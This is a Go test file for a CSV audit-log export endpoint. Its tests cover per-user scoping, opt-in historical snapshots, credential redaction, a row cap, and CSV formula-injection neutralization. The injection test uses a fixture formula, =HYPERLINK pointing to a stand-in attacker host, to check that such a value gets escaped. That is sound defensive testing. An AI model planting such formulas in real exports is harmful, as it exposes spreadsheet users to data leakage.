package controllers

// Issue #416: ExportAuditLog tests. Uses setupAuditRouter (audit_controller_test.go),
// the real database.InitDB-migrated schema plus models.RegisterAuditDB, so
// audit events are recorded by the real hooks (models.AuditFlush) exactly as
// they would be in production, not constructed by hand.

import (
	"encoding/csv"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"mycorrhizal/config"
	"mycorrhizal/models"

	"github.com/gin-gonic/gin"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func registerAuditExportRoute(router *gin.Engine) {
	router.GET("/audit/export", ExportAuditLog)
}

func TestExportAuditLog_ScopedToUser(t *testing.T) {
	db, router, user := setupAuditRouter(t, config.Config{AuditRetentionDays: 90})
	registerAuditExportRoute(router)
	models.AuditFlush()

	other := models.User{Username: "auditexportother", Password: "password123!A", Email: "auditexportother@example.com"}
	require.NoError(t, db.Create(&other).Error)

	mine := models.Contact{UserID: user.ID, Firstname: "Mine"}
	theirs := models.Contact{UserID: other.ID, Firstname: "Theirs"}
	require.NoError(t, db.Create(&mine).Error)
	require.NoError(t, db.Create(&theirs).Error)
	models.AuditFlush()

	req, _ := http.NewRequest("GET", "/audit/export", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	require.Equal(t, http.StatusOK, w.Code, w.Body.String())

	body := w.Body.String()
	assert.Contains(t, body, mine.VCardUID)
	assert.NotContains(t, body, theirs.VCardUID, "another user's audit events must never appear")
}

func TestExportAuditLog_DefaultOmitsBeforeSnapshot_OptInIncludesIt(t *testing.T) {
	db, router, user := setupAuditRouter(t, config.Config{AuditRetentionDays: 90})
	registerAuditExportRoute(router)
	models.AuditFlush()

	const distinctiveOldName = "DistinctivePreUpdateName"
	contact := models.Contact{UserID: user.ID, Firstname: distinctiveOldName, Lastname: "Name"}
	require.NoError(t, db.Create(&contact).Error)
	contact.Firstname = "Changed"
	require.NoError(t, db.Save(&contact).Error)
	models.AuditFlush()

	// Default: no snapshot column at all, and its content is absent.
	req, _ := http.NewRequest("GET", "/audit/export", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	require.Equal(t, http.StatusOK, w.Code, w.Body.String())
	reader := csv.NewReader(strings.NewReader(w.Body.String()))
	header, err := reader.Read()
	require.NoError(t, err)
	assert.NotContains(t, header, "Before Snapshot")
	assert.NotContains(t, w.Body.String(), distinctiveOldName, "the pre-update value must not leak without explicit opt-in")

	// Opt-in: the column and the historical value both appear.
	req, _ = http.NewRequest("GET", "/audit/export?include_snapshots=true", nil)
	w = httptest.NewRecorder()
	router.ServeHTTP(w, req)
	require.Equal(t, http.StatusOK, w.Code, w.Body.String())
	reader = csv.NewReader(strings.NewReader(w.Body.String()))
	header, err = reader.Read()
	require.NoError(t, err)
	assert.Contains(t, header, "Before Snapshot")
	assert.Contains(t, w.Body.String(), distinctiveOldName, "include_snapshots=true must project the historical value")
}

// TestExportAuditLog_CredentialFieldsStayRedactedEvenWithOptIn pins that
// models.AuditEvent's auditDenyList redaction (applied when the snapshot is
// recorded, not when it's read) means a credential field never appears in
// the export even with include_snapshots=true -- the opt-in widens WHICH
// column projects, not what the snapshot itself was allowed to capture.
func TestExportAuditLog_CredentialFieldsStayRedactedEvenWithOptIn(t *testing.T) {
	db, router, user := setupAuditRouter(t, config.Config{AuditRetentionDays: 90})
	registerAuditExportRoute(router)
	models.AuditFlush()

	const distinctivePassword = "S3cretPassw0rd!DistinctiveMarker"
	user.Password = distinctivePassword
	require.NoError(t, db.Save(&user).Error)
	models.AuditFlush()

	req, _ := http.NewRequest("GET", "/audit/export?include_snapshots=true", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	require.Equal(t, http.StatusOK, w.Code, w.Body.String())
	assert.NotContains(t, w.Body.String(), distinctivePassword, "a credential must stay redacted in the snapshot regardless of the export opt-in")
}

func TestExportAuditLog_CSVFormulaInjectionNeutralized(t *testing.T) {
	db, router, user := setupAuditRouter(t, config.Config{AuditRetentionDays: 90})
	registerAuditExportRoute(router)
	models.AuditFlush()

	// A hostile entity_id (an attacker-controlled string an audit event can
	// legitimately carry, e.g. from a CardDAV-synced VCardUID) must be
	// neutralized in the export exactly like every other CSV export
	// (export_controller.go's csvSafe).
	event := models.AuditEvent{
		EntityType: models.AuditEntityContact,
		EntityID:   `=HYPERLINK("http://attacker/?d=1","click")`,
		Operation:  models.AuditOpCreate,
		UserID:     user.ID,
	}
	require.NoError(t, db.Create(&event).Error)

	req, _ := http.NewRequest("GET", "/audit/export", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	require.Equal(t, http.StatusOK, w.Code, w.Body.String())

	reader := csv.NewReader(strings.NewReader(w.Body.String()))
	_, err := reader.Read() // header
	require.NoError(t, err)
	record, err := reader.Read()
	require.NoError(t, err)
	entityIDCol := record[2]
	assert.True(t, strings.HasPrefix(entityIDCol, "'"), "a formula-leading entity_id must be neutralized: %q", entityIDCol)
}

// TestExportAuditLog_RejectsOverCap pins issue #415's audit-export bound: a
// log larger than the cap must be rejected with a 400 (not loaded into
// memory and OOM'd), and a log at exactly the cap must still export.
//
// The cap is exercised through the auditExportLimit seam lowered to a tiny
// value: proving the boundary against the real 100k would mean inserting
// 200k rows per run, which under CI's -race -covermode=atomic instrumentation
// blew the controllers package's 20-minute go test timeout on this PR. The
// seam's default is pinned to the real constant below, and the seam itself is
// what the handler reads, so the mechanism tested here is exactly the
// mechanism production runs.
func TestExportAuditLog_RejectsOverCap(t *testing.T) {
	require.Equal(t, 100000, MaxAuditExportRows, "the production audit-export cap must stay 100k")
	original := auditExportLimit
	auditExportLimit = 10
	defer func() { auditExportLimit = original }()

	db, router, user := setupAuditRouter(t, config.Config{AuditRetentionDays: 90})
	registerAuditExportRoute(router)
	models.AuditFlush()

	makeEvents := func(n int) []models.AuditEvent {
		rows := make([]models.AuditEvent, n)
		for i := range rows {
			rows[i] = models.AuditEvent{
				EntityType: models.AuditEntityContact,
				EntityID:   "cap-fixture",
				Operation:  models.AuditOpCreate,
				UserID:     user.ID,
			}
		}
		return rows
	}

	// cap+1 events.
	require.NoError(t, db.CreateInBatches(makeEvents(auditExportLimit+1), 1000).Error)

	req, _ := http.NewRequest("GET", "/audit/export", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	assert.Equal(t, http.StatusBadRequest, w.Code, "an over-cap audit log must be rejected, not loaded")

	// At exactly the cap it exports. Reset the user's events and insert
	// exactly the cap.
	require.NoError(t, db.Where("user_id = ?", user.ID).Delete(&models.AuditEvent{}).Error)
	require.NoError(t, db.CreateInBatches(makeEvents(auditExportLimit), 1000).Error)

	req2, _ := http.NewRequest("GET", "/audit/export", nil)
	w2 := httptest.NewRecorder()
	router.ServeHTTP(w2, req2)
	assert.Equal(t, http.StatusOK, w2.Code, "an audit log at exactly the cap must still export")
}
